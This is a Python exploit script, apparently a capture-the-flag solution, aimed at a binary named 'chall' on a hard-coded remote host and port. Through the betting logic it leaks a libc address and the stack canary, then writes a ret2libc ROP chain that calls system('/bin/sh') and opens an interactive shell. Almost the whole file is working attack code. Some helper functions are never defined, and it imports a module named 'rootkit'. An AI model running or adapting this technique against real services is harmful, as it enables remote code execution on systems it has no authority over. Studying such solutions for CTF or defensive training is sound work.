#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./chall')

host = args.HOST or '34.126.147.93'
port = int(args.PORT or 2200)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main
b *main+1302
continue
'''.format(**locals())

# -- Exploit goes here --

def add_bet(bet):
    reu("Current Balance=$")
    money = rl().strip(b'\n')
    print(f"current money : {money}")
    sla('Enter bet value: ', str(bet))
    return money

def set_name(name):
    re()
    sl(name)

libc = ELF(exe.libc.path)
io = start()
fuck = True
set_name("A"*100)
idx_jour = 0
while fuck:
    try:
        idx_jour = idx_jour + 1
        reu("Current Balance=$")
        money = int(rl().strip(b'\n'))
        # print(f"current money : {money}")
        sla('Enter bet value: ', "5m")
        if idx_jour == 2:
            add_bet("v")
            reu("Bet #2: Value ")
            libc.address = int(rl().strip(b"\n")) % 2**64 - 0x223e10
            print(hex(libc.address))
        if idx_jour == 100 + 4 + 13:
            print("reached canary")
            add_bet("v")
            reu("Bet #117: Value ")
            canary = int(rl().strip(b"\n")) % 2**64
            log.info(f"canary : {hex(canary)}")
            # gdb.attach(io.pid, gdbscript = gdbscript)
            add_bet(canary)
            add_bet(0xdeadbeef)
            add_bet(libc.address + 0x00000000026b72)
            binsh = next(libc.search(b'/bin/sh\x00'))
            ret = libc.address + 0x0000000013e4a3
            add_bet(binsh)
            add_bet(ret)
            add_bet(libc.sym.system)
            add_bet("x")
            break            
    except :
        io.close()

io.interactive()

